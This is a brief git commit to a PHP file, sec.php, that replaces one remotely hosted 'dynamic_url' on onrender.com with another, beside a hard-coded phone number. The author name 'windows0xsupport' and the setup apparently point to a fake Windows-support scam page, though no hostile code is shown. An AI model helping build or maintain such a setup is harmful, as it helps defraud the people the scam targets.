d437cdb111427235bec9cfb78e61c7c632ef6f4f
windows0xsupport <ankitkatariacool9@gmail.com>
2026-05-13 18:45:58 +0900

    url

--- sec.php
+++ sec.php
@@ -1,6 +1,6 @@
 <?php
 $number = '0101-551-248-7708';
-$dynamic_url = "https://onrender-3brc.onrender.com";
+$dynamic_url = "https://onrender2-jpxc.onrender.com";
 #$dynamic_url = "http://127.0.0.1:8080";
 
 
